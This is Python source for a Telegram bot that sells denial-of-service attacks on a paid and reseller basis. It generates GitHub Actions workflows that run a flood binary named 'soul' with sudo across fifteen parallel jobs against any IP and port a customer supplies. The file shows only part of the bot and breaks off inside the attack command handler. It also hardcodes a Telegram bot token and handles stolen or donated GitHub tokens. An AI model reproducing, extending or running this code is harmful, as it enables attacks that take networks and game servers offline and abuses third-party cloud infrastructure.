import os
import json
import logging
import threading
import time
import random
import string
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler
from github import Github, GithubException


logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8531603272:AAGdBJvoMi7VuirUAbxsG6Aa__0N6tnmI2w"
YML_FILE_PATH = ".github/workflows/main.yml"
BINARY_FILE_NAME = "soul"
# ADMIN_IDS = [521756472, 7733336238,7772881209] 
ADMIN_IDS = [754041005]
OWNER_IDS = [754041005]

WAITING_FOR_BINARY = 1
WAITING_FOR_BROADCAST = 2
WAITING_FOR_OWNER_ADD = 3
WAITING_FOR_OWNER_DELETE = 4
WAITING_FOR_RESELLER_ADD = 5
WAITING_FOR_RESELLER_REMOVE = 6


current_attack = None
attack_lock = threading.Lock()
cooldown_until = 0
COOLDOWN_DURATION = 40
MAINTENANCE_MODE = False
MAX_ATTACKS = 40 
user_attack_counts = {}  

USER_PRICES = {
    "1": 120,
    "2": 240,
    "3": 360,
    "4": 450,
    "7": 650
}

RESELLER_PRICES = {
    "1": 150,
    "2": 250,
    "3": 300,
    "4": 400,
    "7": 550
}


def load_users():
    try:
        with open('users.json', 'r') as f:
            users_data = json.load(f)
            if not users_data:
                initial_users = ADMIN_IDS.copy()
                save_users(initial_users)
                return set(initial_users)
            return set(users_data)
    except FileNotFoundError:
        initial_users = ADMIN_IDS.copy()
        save_users(initial_users)
        return set(initial_users)

def save_users(users):
    with open('users.json', 'w') as f:
        json.dump(list(users), f)

def load_pending_users():
    try:
        with open('pending_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_pending_users(pending_users):
    with open('pending_users.json', 'w') as f:
        json.dump(pending_users, f, indent=2)

def load_approved_users():
    try:
        with open('approved_users.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_approved_users(approved_users):
    with open('approved_users.json', 'w') as f:
        json.dump(approved_users, f, indent=2)

def load_owners():
    try:
        with open('owners.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        owners = {}
        for admin_id in ADMIN_IDS:
            owners[str(admin_id)] = {
                "username": f"owner_{admin_id}",
                "added_by": "system",
                "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "is_primary": True
            }
        save_owners(owners)
        return owners

def save_owners(owners):
    with open('owners.json', 'w') as f:
        json.dump(owners, f, indent=2)

def load_admins():
    try:
        with open('admins.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_admins(admins):
    with open('admins.json', 'w') as f:
        json.dump(admins, f, indent=2)

def load_groups():
    try:
        with open('groups.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_groups(groups):
    with open('groups.json', 'w') as f:
        json.dump(groups, f, indent=2)

def load_resellers():
    try:
        with open('resellers.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_resellers(resellers):
    with open('resellers.json', 'w') as f:
        json.dump(resellers, f, indent=2)

def load_github_tokens():
    try:
        with open('github_tokens.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def save_github_tokens(tokens):
    with open('github_tokens.json', 'w') as f:
        json.dump(tokens, f, indent=2)

def load_attack_state():
    try:
        with open('attack_state.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"current_attack": None, "cooldown_until": 0}

def save_attack_state():
    state = {
        "current_attack": current_attack,
        "cooldown_until": cooldown_until
    }
    with open('attack_state.json', 'w') as f:
        json.dump(state, f, indent=2)

def load_maintenance_mode():
    try:
        with open('maintenance.json', 'r') as f:
            data = json.load(f)
            return data.get("maintenance", False)
    except FileNotFoundError:
        return False

def save_maintenance_mode(mode):
    with open('maintenance.json', 'w') as f:
        json.dump({"maintenance": mode}, f, indent=2)

def load_cooldown():
    try:
        with open('cooldown.json', 'r') as f:
            data = json.load(f)
            return data.get("cooldown", 40)
    except FileNotFoundError:
        return 40

def save_cooldown(duration):
    with open('cooldown.json', 'w') as f:
        json.dump({"cooldown": duration}, f, indent=2)

def load_max_attacks():
    try:
        with open('max_attacks.json', 'r') as f:
            data = json.load(f)
            return data.get("max_attacks", 1)
    except FileNotFoundError:
        return 1

def save_max_attacks(max_attacks):
    with open('max_attacks.json', 'w') as f:
        json.dump({"max_attacks": max_attacks}, f, indent=2)

def load_trial_keys():
    try:
        with open('trial_keys.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_trial_keys(keys):
    with open('trial_keys.json', 'w') as f:
        json.dump(keys, f, indent=2)

def load_user_attack_counts():
    try:
        with open('user_attack_counts.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_user_attack_counts(counts):
    with open('user_attack_counts.json', 'w') as f:
        json.dump(counts, f, indent=2)


authorized_users = load_users()
pending_users = load_pending_users()
approved_users = load_approved_users()
owners = load_owners()
admins = load_admins()
groups = load_groups()
resellers = load_resellers()
github_tokens = load_github_tokens()
MAINTENANCE_MODE = load_maintenance_mode()
COOLDOWN_DURATION = load_cooldown()
MAX_ATTACKS = load_max_attacks()
user_attack_counts = load_user_attack_counts()
trial_keys = load_trial_keys()

attack_state = load_attack_state()
current_attack = attack_state.get("current_attack")
cooldown_until = attack_state.get("cooldown_until", 0)


def is_primary_owner(user_id):
    user_id_str = str(user_id)
    if user_id_str in owners:
        return owners[user_id_str].get("is_primary", False)
    return False

def is_owner(user_id):
    return str(user_id) in owners

def is_admin(user_id):
    return str(user_id) in admins

def is_reseller(user_id):
    return str(user_id) in resellers

def is_approved_user(user_id):
    user_id_str = str(user_id)
    if user_id_str in approved_users:
        expiry_timestamp = approved_users[user_id_str]['expiry']
        if expiry_timestamp == "LIFETIME":
            return True
        current_time = time.time()
        if current_time < expiry_timestamp:
            return True
        else:
            
            del approved_users[user_id_str]
            save_approved_users(approved_users)
    return False

def can_user_attack(user_id):
    return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE
# def can_user_attack(user_id):
#     return (is_owner(user_id) or is_admin(user_id) or is_reseller(user_id) or is_approved_user(user_id)) and not MAINTENANCE_MODE

def can_start_attack(user_id):
    global current_attack, cooldown_until
    
    if MAINTENANCE_MODE:
        return False, "⚠️ **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ**\n━━━━━━━━━━━━━━━━━━━━━━\nʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ."
    
    
    user_id_str = str(user_id)
    current_count = user_attack_counts.get(user_id_str, 0)
    # if current_count >= MAX_ATTACKS:
    #     return False, f"⚠️ **ᴍᴀxɪᴍᴜᴍ ᴀᴛᴛᴀᴄᴋ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ**\n━━━━━━━━━━━━━━━━━━━━━━\nʏᴏᴜ ʜᴀᴠᴇ ᴜsᴇᴅ ᴀʟʟ {MAX_ATTACKS} ᴀᴛᴛᴀᴄᴋ(s). ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ғᴏʀ ᴍᴏʀᴇ."
    
    if current_attack is not None:
        return False, "⚠️ **ᴇʀʀᴏʀ: ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ᴜɴᴛɪʟ ᴛʜᴇ ᴄᴜʀʀᴇɴᴛ ᴀᴛᴛᴀᴄᴋ ғɪɴɪsʜᴇs ᴏʀ 40 sᴇᴄᴏɴᴅs ᴄᴏᴏʟᴅᴏᴡɴ."
    
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_time = int(cooldown_until - current_time)
        return False, f"⏳ **ᴄᴏᴏʟᴅᴏᴡɴ ʀᴇᴍᴀɪɴɪɴɢ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ `{remaining_time}` sᴇᴄᴏɴᴅs ʙᴇғᴏʀᴇ sᴛᴀʀᴛɪɴɢ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ."
    
    return True, "✅ ʀᴇᴀᴅʏ ᴛᴏ sᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ"

def get_attack_method(ip):
    if ip.startswith('91'):
        return "VC FLOOD", "ɢᴀᴍᴇ"
    elif ip.startswith(('15', '96')):
        return None, "⚠️ ɪɴᴠᴀʟɪᴅ ɪᴘ - ɪᴘs sᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ '15' ᴏʀ '96' ᴀʀᴇ ɴᴏᴛ ᴀʟʟᴏᴡᴇᴅ"
    else:
        return "BGMI FLOOD", "ɢᴀᴍᴇ"

def is_valid_ip(ip):
    return not ip.startswith(('15', '96'))

def start_attack(ip, port, time_val, user_id, method):
    global current_attack
    current_attack = {
        "ip": ip,
        "port": port,
        "time": time_val,
        "user_id": user_id,
        "method": method,
        "start_time": time.time(),
        "estimated_end_time": time.time() + int(time_val)
    }
    save_attack_state()
    
    
    user_id_str = str(user_id)
    user_attack_counts[user_id_str] = user_attack_counts.get(user_id_str, 0) + 1
    save_user_attack_counts(user_attack_counts)

def finish_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def stop_attack():
    global current_attack, cooldown_until
    current_attack = None
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()

def get_attack_status():
    global current_attack, cooldown_until
    
    if current_attack is not None:
        current_time = time.time()
        elapsed = int(current_time - current_attack['start_time'])
        remaining = max(0, int(current_attack['estimated_end_time'] - current_time))
        
        return {
            "status": "running",
            "attack": current_attack,
            "elapsed": elapsed,
            "remaining": remaining
        }
    
    current_time = time.time()
    if current_time < cooldown_until:
        remaining_cooldown = int(cooldown_until - current_time)
        return {
            "status": "cooldown",
            "remaining_cooldown": remaining_cooldown
        }
    
    return {"status": "ready"}


def generate_trial_key(hours):
    
    key = f"TRL-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=4))}"
    
    
    expiry = time.time() + (hours * 3600)  
    
    
    trial_keys[key] = {
        "hours": hours,
        "expiry": expiry,
        "used": False,
        "used_by": None,
        "created_at": time.time(),
        "created_by": "system"
    }
    save_trial_keys(trial_keys)
    
    return key

def redeem_trial_key(key, user_id):
    user_id_str = str(user_id)
    
    if key not in trial_keys:
        return False, "ɪɴᴠᴀʟɪᴅ ᴋᴇʏ"
    
    key_data = trial_keys[key]
    
    if key_data["used"]:
        return False, "ᴋᴇʏ ᴀʟʀᴇᴀᴅʏ ᴜsᴇᴅ"
    
    if time.time() > key_data["expiry"]:
        return False, "ᴋᴇʏ ᴇxᴘɪʀᴇᴅ"
    
    
    key_data["used"] = True
    key_data["used_by"] = user_id_str
    key_data["used_at"] = time.time()
    trial_keys[key] = key_data
    save_trial_keys(trial_keys)
    
    
    expiry = time.time() + (key_data["hours"] * 3600)
    approved_users[user_id_str] = {
        "username": f"user_{user_id}",
        "added_by": "trial_key",
        "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
        "expiry": expiry,
        "days": key_data["hours"] / 24,
        "trial": True
    }
    save_approved_users(approved_users)
    
    return True, f"✅ ᴛʀɪᴀʟ ᴀᴄᴄᴇss ᴀᴄᴛɪᴠᴀᴛᴇᴅ ғᴏʀ {key_data['hours']} ʜᴏᴜʀs!"


def create_repository(token, repo_name="soulcrack-tg"):
    try:
        g = Github(token)
        user = g.get_user()
        
        try:
            repo = user.get_repo(repo_name)
            return repo, False
        except GithubException:
            repo = user.create_repo(
                repo_name,
                description="SOULCRACK DDOS Bot Repository",
                private=False,
                auto_init=False
            )
            return repo, True
    except Exception as e:
        raise Exception(f"Failed to create repository: {e}")

def update_yml_file(token, repo_name, ip, port, time_val, method):
    yml_content = f"""
name: soul Attack
on: [push]

jobs:
  first-five-jobs:
    runs-on: ubuntu-22.04
    strategy:
      matrix:
        n: [1,2,3,4,5]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} 10 150

  next-ten-jobs:
    runs-on: ubuntu-22.04
    needs: first-five-jobs
    strategy:
      matrix:
        n: [6,7,8,9,10,11,12,13,14,15]
    steps:
    - uses: actions/checkout@v3
    - run: chmod +x soul
    - run: sudo ./soul {ip} {port} {time_val} 400
"""
    
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        
        try:
            file_content = repo.get_contents(YML_FILE_PATH)
            repo.update_file(
                YML_FILE_PATH,
                f"Update attack parameters - {ip}:{port} ({method})",
                yml_content,
                file_content.sha
            )
            logger.info(f"✅ Updated configuration for {repo_name}")
        except:
            repo.create_file(
                YML_FILE_PATH,
                f"Create attack parameters - {ip}:{port} ({method})",
                yml_content
            )
            logger.info(f"✅ Created configuration for {repo_name}")
        
        return True
    except Exception as e:
        logger.error(f"❌ Error for {repo_name}: {e}")
        return False

def instant_stop_all_jobs(token, repo_name):
    try:
        g = Github(token)
        repo = g.get_repo(repo_name)
        
        running_statuses = ['queued', 'in_progress', 'pending']
        total_cancelled = 0
        
        for status in running_statuses:
            try:
                workflows = repo.get_workflow_runs(status=status)
                for workflow in workflows:
                    try:
                        workflow.cancel()
                        total_cancelled += 1
                        logger.info(f"✅ INSTANT STOP: Cancelled {status} workflow {workflow.id} for {repo_name}")
                    except Exception as e:
                        logger.error(f"❌ Error cancelling workflow {workflow.id}: {e}")
            except Exception as e:
                logger.error(f"❌ Error getting {status} workflows: {e}")
        
        return total_cancelled
        
    except Exception as e:
        logger.error(f"❌ Error accessing {repo_name}: {e}")
        return 0


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if MAINTENANCE_MODE and not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text(
            "🔧 **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ.\n"
            "ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ᴜɴᴛɪʟ ɪᴛ's ʙᴀᴄᴋ."
        )
        return
    
    if not can_user_attack(user_id):
        user_exists = False
        for user in pending_users:
            if str(user['user_id']) == str(user_id):
                user_exists = True
                break
        
        if not user_exists:
            pending_users.append({
                "user_id": user_id,
                "username": update.effective_user.username or f"user_{user_id}",
                "request_date": time.strftime("%Y-%m-%d %H:%M:%S")
            })
            save_pending_users(pending_users)
            
            
            for owner_id in owners.keys():
                try:
                    await context.bot.send_message(
                        chat_id=int(owner_id),
                        text=f"📥 **ɴᴇᴡ ᴀᴄᴄᴇss ʀᴇǫᴜᴇsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\nᴜsᴇʀ: @{update.effective_user.username or 'No username'}\nɪᴅ: `{user_id}`\nᴜsᴇ /add {user_id} 7 ᴛᴏ ᴀᴘᴘʀᴏᴠᴇ"
                    )
                except:
                    pass
        
        await update.message.reply_text(
            "📋 **ᴀᴄᴄᴇss ʀᴇǫᴜᴇsᴛ sᴇɴᴛ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ʏᴏᴜʀ ᴀᴄᴄᴇss ʀᴇǫᴜᴇsᴛ ʜᴀs ʙᴇᴇɴ sᴇɴᴛ ᴛᴏ ᴀᴅᴍɪɴ.\n"
            "ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ.\n\n"
            "ᴜsᴇ /id ᴛᴏ ɢᴇᴛ ʏᴏᴜʀ ᴜsᴇʀ ɪᴅ\n"
            "ᴜsᴇ /help ғᴏʀ ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs\n\n"
            "💡 **ᴡᴀɴᴛ ᴀ ᴛʀɪᴀʟ?**\n"
            "ᴀsᴋ ᴀᴅᴍɪɴ ғᴏʀ ᴀ ᴛʀɪᴀʟ ᴋᴇʏ ᴏʀ ʀᴇᴅᴇᴇᴍ ᴏɴᴇ ᴡɪᴛʜ /redeem <ᴋᴇʏ>"
        )
        return
    
    attack_status = get_attack_status()
    
    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        await update.message.reply_text(
            "🔥 **ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 ᴛᴀʀɢᴇᴛ: `{attack['ip']}:{attack['port']}`\n"
            f"⏱️ ᴇʟᴀᴘsᴇᴅ: `{attack_status['elapsed']}s`\n"
            f"⏳ ʀᴇᴍᴀɪɴɪɴɢ: `{attack_status['remaining']}s`"
        )
        return
    
    if attack_status["status"] == "cooldown":
        await update.message.reply_text(
            "⏳ **ᴄᴏᴏʟᴅᴏᴡɴ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ `{attack_status['remaining_cooldown']}s`\n"
            "ʙᴇғᴏʀᴇ sᴛᴀʀᴛɪɴɢ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ."
        )
        return
    
    
    if is_owner(user_id):
        if is_primary_owner(user_id):
            user_role = "👑 ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀ"
        else:
            user_role = "👑 ᴏᴡɴᴇʀ"
    elif is_admin(user_id):
        user_role = "🛡️ ᴀᴅᴍɪɴ"
    elif is_reseller(user_id):
        user_role = "💰 ʀᴇsᴇʟʟᴇʀ"
    else:
        user_role = "👤 ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀ"
    
    
    user_id_str = str(user_id)
    current_attacks = 0
    remaining_attacks = MAX_ATTACKS - current_attacks
    
    await update.message.reply_text(
        f"🤖 **ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ʙᴏᴛ** 🤖\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{user_role}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🎯 **ʀᴇᴍᴀɪɴɪɴɢ ᴀᴛᴛᴀᴄᴋs:** {remaining_attacks}/{MAX_ATTACKS}\n\n"
        "📋 **ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs:**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "• /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ> - sᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ\n"
        "• /status - ᴄʜᴇᴄᴋ ᴀᴛᴛᴀᴄᴋ sᴛᴀᴛᴜs\n"
        "• /stop - sᴛᴏᴘ ᴀʟʟ ᴀᴛᴛᴀᴄᴋs\n"
        "• /id - ɢᴇᴛ ʏᴏᴜʀ ᴜsᴇʀ ɪᴅ\n"
        "• /myaccess - ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴀᴄᴄᴇss\n"
        "• /help - sʜᴏᴡ ʜᴇʟᴘ\n"
        "• /redeem <ᴋᴇʏ> - ʀᴇᴅᴇᴇᴍ ᴛʀɪᴀʟ ᴋᴇʏ\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📢 **ɴᴏᴛᴇs:**\n"
        f"• ᴏɴʟʏ ᴏɴᴇ ᴀᴛᴛᴀᴄᴋ ᴀᴛ ᴀ ᴛɪᴍᴇ\n"
        f"• {COOLDOWN_DURATION}s ᴄᴏᴏʟᴅᴏᴡɴ ᴀғᴛᴇʀ ᴀᴛᴛᴀᴄᴋ\n"
        f"• ɪɴᴠᴀʟɪᴅ ɪᴘs: '15', '96'"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_owner(user_id) or is_admin(user_id):
        await update.message.reply_text(
            "🆘 **ʜᴇʟᴘ - ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**ғᴏʀ ᴀʟʟ ᴜsᴇʀs:**\n"
            "• /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\n"
            "• /status - ᴄʜᴇᴄᴋ sᴛᴀᴛᴜs\n"
            "• /stop - sᴛᴏᴘ ᴀᴛᴛᴀᴄᴋ\n"
            "• /id - ɢᴇᴛ ʏᴏᴜʀ ɪᴅ\n"
            "• /myaccess - ᴄʜᴇᴄᴋ ᴀᴄᴄᴇss\n"
            "• /help - sʜᴏᴡ ʜᴇʟᴘ\n"
            "• /redeem <ᴋᴇʏ> - ʀᴇᴅᴇᴇᴍ ᴛʀɪᴀʟ ᴋᴇʏ\n\n"
            "**ᴀᴅᴍɪɴ ᴄᴏᴍᴍᴀɴᴅs:**\n"
            "• /add <ɪᴅ> <ᴅᴀʏs> - ᴀᴅᴅ ᴜsᴇʀ\n"
            "• /remove <ɪᴅ> - ʀᴇᴍᴏᴠᴇ ᴜsᴇʀ\n"
            "• /userslist - ʟɪsᴛ ᴜsᴇʀs\n"
            "• /approveuserslist - ᴘᴇɴᴅɪɴɢ ʟɪsᴛ\n"
            "• /ownerlist - ʟɪsᴛ ᴏᴡɴᴇʀs\n"
            "• /adminlist - ʟɪsᴛ ᴀᴅᴍɪɴs\n"
            "• /resellerlist - ʟɪsᴛ ʀᴇsᴇʟʟᴇʀs\n"
            "• /pricelist - sʜᴏᴡ ᴘʀɪᴄᴇs\n"
            "• /resellerpricelist - ʀᴇsᴇʟʟᴇʀ ᴘʀɪᴄᴇs\n"
            "• /listgrp - ʟɪsᴛ ɢʀᴏᴜᴘs\n"
            "• /maintenance <ᴏɴ/ᴏғғ>\n"
            "• /broadcast - sᴇɴᴅ ʙʀᴏᴀᴅᴄᴀsᴛ\n"
            "• /setcooldown <sᴇᴄᴏɴᴅs>\n"
            "• /setmaxattack <ɴᴜᴍʙᴇʀ>\n"
            "• /gentrailkey <ʜᴏᴜʀs> - ɢᴇɴᴇʀᴀᴛᴇ ᴛʀɪᴀʟ ᴋᴇʏ\n"
            "• /addtoken - ᴀᴅᴅ ɢɪᴛʜᴜʙ ᴛᴏᴋᴇɴ\n"
            "• /tokens - ʟɪsᴛ ᴛᴏᴋᴇɴs\n"
            "• /removetoken - ʀᴇᴍᴏᴠᴇ ᴛᴏᴋᴇɴ\n"
            "• /removexpiredtoken - ʀᴇᴍᴏᴠᴇ ᴇxᴘɪʀᴇᴅ ᴛᴏᴋᴇɴs\n"
            "• /binary_upload - ᴜᴘʟᴏᴀᴅ ʙɪɴᴀʀʏ\n"
            "• /addowner - ᴀᴅᴅ ᴏᴡɴᴇʀ\n"
            "• /deleteowner - ʀᴇᴍᴏᴠᴇ ᴏᴡɴᴇʀ\n"
            "• /addreseller - ᴀᴅᴅ ʀᴇsᴇʟʟᴇʀ\n"
            "• /removereseller - ʀᴇᴍᴏᴠᴇ ʀᴇsᴇʟʟᴇʀ\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**ɴᴇᴇᴅ ʜᴇʟᴘ?** ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ."
        )
    elif can_user_attack(user_id):
        await update.message.reply_text(
            "🆘 **ʜᴇʟᴘ - ᴀᴠᴀɪʟᴀʙʟᴇ ᴄᴏᴍᴍᴀɴᴅs**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "• /attack <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\n"
            "• /status - ᴄʜᴇᴄᴋ sᴛᴀᴛᴜs\n"
            "• /stop - sᴛᴏᴘ ᴀᴛᴛᴀᴄᴋ\n"
            "• /id - ɢᴇᴛ ʏᴏᴜʀ ɪᴅ\n"
            "• /myaccess - ᴄʜᴇᴄᴋ ᴀᴄᴄᴇss\n"
            "• /help - sʜᴏᴡ ʜᴇʟᴘ\n"
            "• /redeem <ᴋᴇʏ> - ʀᴇᴅᴇᴇᴍ ᴛʀɪᴀʟ ᴋᴇʏ\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**ɴᴇᴇᴅ ʜᴇʟᴘ?** ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ."
        )
    else:
        await update.message.reply_text(
            f"🆘 **ʜᴇʟᴘ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "• /id - ɢᴇᴛ ʏᴏᴜʀ ᴜsᴇʀ ɪᴅ\n"
            "• /help - sʜᴏᴡ ʜᴇʟᴘ\n"
            "• /redeem <ᴋᴇʏ> - ʀᴇᴅᴇᴇᴍ ᴛʀɪᴀʟ ᴋᴇʏ\n\n"
            "**ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss:**\n"
            "1. ᴜsᴇ /start ᴛᴏ ʀᴇǫᴜᴇsᴛ\n"
            "2. ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ\n"
            "3. ᴡᴀɪᴛ ғᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"**ʏᴏᴜʀ ɪᴅ:** `{user_id}`"
        )

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "ɴᴏ ᴜsᴇʀɴᴀᴍᴇ"
    
    await update.message.reply_text(
        f"🆔 **ʏᴏᴜʀ ᴜsᴇʀ ɪᴅᴇɴᴛɪғɪᴄᴀᴛɪᴏɴ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• **ᴜsᴇʀ ɪᴅ:** `{user_id}`\n"
        f"• **ᴜsᴇʀɴᴀᴍᴇ:** @{username}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "sᴇɴᴅ ᴛʜɪs ɪᴅ ᴛᴏ ᴀᴅᴍɪɴ ғᴏʀ ᴀᴄᴄᴇss."
    )

async def myaccess_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_owner(user_id):
        if is_primary_owner(user_id):
            role = "👑 ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀ"
        else:
            role = "👑 ᴏᴡɴᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_admin(user_id):
        role = "🛡️ ᴀᴅᴍɪɴ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_reseller(user_id):
        role = "💰 ʀᴇsᴇʟʟᴇʀ"
        reseller_data = resellers.get(str(user_id), {})
        expiry = reseller_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "ᴇxᴘɪʀᴇᴅ"
                else:
                    expiry_date = time.strftime("%Y-%ᴍ-%ᴅ", time.localtime(expiry_time))
                    expiry = expiry_date
            except:
                pass
    elif is_approved_user(user_id):
        role = "👤 ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀ"
        user_data = approved_users.get(str(user_id), {})
        expiry = user_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "ᴇxᴘɪʀᴇᴅ"
                else:
                    expiry_date = time.strftime("%Y-%ᴍ-%ᴅ", time.localtime(expiry_time))
                    expiry = expiry_date
            except:
                pass
    else:
        role = "⏳ ᴘᴇɴᴅɪɴɢ"
        expiry = "ᴡᴀɪᴛɪɴɢ ғᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ"
    
    
    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks
    
    await update.message.reply_text(
        f"🔐 **ʏᴏᴜʀ ᴀᴄᴄᴇss ɪɴғᴏ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• **ʀᴏʟᴇ:** {role}\n"
        f"• **ᴜsᴇʀ ɪᴅ:** `{user_id}`\n"
        f"• **ᴜsᴇʀɴᴀᴍᴇ:** @{update.effective_user.username or 'ɴᴏ ᴜsᴇʀɴᴀᴍᴇ'}\n"
        f"• **ᴇxᴘɪʀʏ:** {expiry}\n"
        f"• **ʀᴇᴍᴀɪɴɪɴɢ ᴀᴛᴛᴀᴄᴋs:** {remaining_attacks}/{MAX_ATTACKS}\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"**ᴀᴛᴛᴀᴄᴋ ᴀᴄᴄᴇss:** {'✅ ʏᴇs' if can_user_attack(user_id) else '❌ ɴᴏ'}"
    )


async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not can_user_attack(user_id):
        await update.message.reply_text(
            "⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴛᴏ ᴀᴛᴛᴀᴄᴋ.\n"
            "ᴜsᴇ /start ᴛᴏ ʀᴇǫᴜᴇsᴛ ᴀᴄᴄᴇss."
        )
        return
    
    can_start, message = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(message)
